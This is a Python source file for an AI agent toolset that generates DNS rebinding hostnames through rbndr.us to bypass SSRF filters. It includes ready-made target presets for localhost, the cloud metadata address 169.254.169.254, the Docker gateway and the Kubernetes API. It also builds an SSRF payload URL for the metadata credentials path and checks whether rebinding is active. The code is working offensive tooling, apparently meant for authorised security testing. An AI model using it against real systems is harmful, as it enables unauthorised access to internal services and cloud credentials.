"""DNS rebinding hostname generator via rbndr.us for SSRF filter bypass.

Generates hostnames that alternate DNS resolution between two IPs (low TTL).
Primary use: bypass DNS-based SSRF filters where the application resolves
before fetching — first resolve returns allowed IP, subsequent resolves
return the internal target (127.0.0.1, 169.254.169.254, etc.).
"""

from __future__ import annotations

import socket
import struct
from typing import Annotated

from dreadnode.agents.tools import Toolset, tool_method


_PRESETS: dict[str, tuple[str, str]] = {
    "localhost": ("1.1.1.1", "127.0.0.1"),
    "metadata": ("1.1.1.1", "169.254.169.254"),
    "docker": ("1.1.1.1", "172.17.0.1"),
    "k8s-api": ("1.1.1.1", "10.96.0.1"),
    "internal-10": ("1.1.1.1", "10.0.0.1"),
    "internal-192": ("1.1.1.1", "192.168.1.1"),
}


def _ip_to_hex(ip: str) -> str:
    """Convert dotted-quad IP to 8-char hex string for rbndr.us subdomain."""
    packed = socket.inet_aton(ip)
    return struct.pack("!I", struct.unpack("!I", packed)[0]).hex()


def _make_hostname(ip1: str, ip2: str) -> str:
    return f"{_ip_to_hex(ip1)}.{_ip_to_hex(ip2)}.rbndr.us"


class DnsRebinding(Toolset):
    """DNS rebinding via rbndr.us for SSRF filter bypass.

    Generates hostnames that alternate DNS resolution between a public IP
    (passes filter) and an internal target IP (hits after TTL expires).
    Use when SSRF filters validate the resolved IP before fetching.
    """

    @tool_method(name="generate_rebinding_hostname", catch=True)
    async def generate_rebinding_hostname(
        self,
        ip1: Annotated[str, "Public/allowed IP that passes the filter (e.g. 1.1.1.1)"],
        ip2: Annotated[str, "Internal target IP to rebind to (e.g. 169.254.169.254)"],
    ) -> str:
        """Generate a rbndr.us hostname that alternates DNS resolution between two IPs.

        The hostname resolves to ip1 on some lookups and ip2 on others (low TTL).
        Use ip1 as a public IP that passes SSRF filters, ip2 as the internal target.
        """
        try:
            hostname = _make_hostname(ip1, ip2)
        except OSError:
            return f"Error: Invalid IP address in ip1={ip1} or ip2={ip2}"

        lines = [
            f"hostname:  {hostname}",
            f"resolves:  {ip1} <-> {ip2} (alternating, low TTL)",
            f"http url:  http://{hostname}/",
        ]
        if "169.254" in ip2:
            lines.append(f"ssrf pay:  http://{hostname}/latest/meta-data/")

        lines.append(
            "\nInject the hostname in SSRF payloads. The target's DNS resolver "
            "will sometimes get ip1 (passes filter) and sometimes ip2 (hits internal). "
            "Multiple requests may be needed due to probabilistic rebinding."
        )
        return "\n".join(lines)

    @tool_method(name="resolve_rebinding_hostname", catch=True)
    async def resolve_rebinding_hostname(
        self,
        hostname: Annotated[str, "rbndr.us hostname to resolve"],
    ) -> str:
        """Resolve a rbndr.us hostname multiple times to check if rebinding is active.

        Makes 6 DNS lookups and reports all observed IPs. Multiple IPs means
        rebinding is working. Single IP means retry — rebinding is probabilistic.
        """
        try:
            results = set()
            for _ in range(6):
                ip = socket.gethostbyname(hostname)
                results.add(ip)
            ips = ", ".join(sorted(results))
            if len(results) > 1:
                return f"resolved: {ips}\nstatus: rebinding active (multiple IPs observed)"
            return f"resolved: {ips}\nstatus: single IP (retry — rebinding is probabilistic)"
        except socket.gaierror as e:
            return f"Error: DNS resolution failed: {e}"

    @tool_method(name="list_rebinding_presets", catch=True)
    async def list_rebinding_presets(self) -> str:
        """List common DNS rebinding pairs for SSRF testing.

        Shows preset hostname pairs for localhost, cloud metadata (AWS/GCP/Azure),
        Docker gateway, Kubernetes API, and RFC1918 internal ranges.
        """
        lines = [f"{'name':<14} {'ip1 (public)':<16} {'ip2 (target)':<20} hostname"]
        lines.append("-" * 78)
        for name, (ip1, ip2) in _PRESETS.items():
            hostname = _make_hostname(ip1, ip2)
            lines.append(f"{name:<14} {ip1:<16} {ip2:<20} {hostname}")
        return "\n".join(lines)
